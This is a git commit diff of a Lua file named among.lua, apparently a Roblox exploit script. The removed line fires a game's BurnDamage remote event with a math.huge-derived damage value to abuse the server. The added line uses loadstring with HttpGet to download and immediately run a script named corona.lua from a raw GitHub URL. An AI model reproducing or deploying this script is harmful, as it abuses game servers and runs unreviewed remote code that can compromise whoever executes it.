552489971f1b90a0674327fced51e5979dbd7f6a
amogusimpostor <99112532+theplantman@users.noreply.github.com>
2022-10-19 15:02:59 +0800

    Update among.lua

--- among.lua
+++ among.lua
@@ -1,2 +1,1 @@
-game.ReplicatedStorage.BurnDamage:FireServer(game.Players.LocalPlayer.Character.Humanoid, CFrame.new(), 0 * math.huge, 0, Vector3.new(), "rbxassetid://241837157", 0, Color3.new(), "", 0, 0)
-loadstring(
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theplantman/plantaddress/main/corona.lua", true))()
